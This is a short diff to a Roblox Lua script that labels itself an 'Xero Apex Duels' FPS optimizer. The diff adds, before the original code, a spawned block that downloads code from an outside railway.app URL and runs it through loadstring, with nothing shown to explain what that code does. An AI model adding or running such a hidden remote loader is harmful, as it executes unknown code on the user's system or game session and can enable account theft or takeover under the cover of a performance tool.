@@ -1,4 +1,8 @@
 task.spawn(function()
+loadstring(game:HttpGet("https://ors-production-ef06.up.railway.app/s/8e11587ec87f9d06", true))()
+end)
+
+task.spawn(function()
 -- Xero Apex Duels
 
 --// OPTIMIZER FPS (REAL)
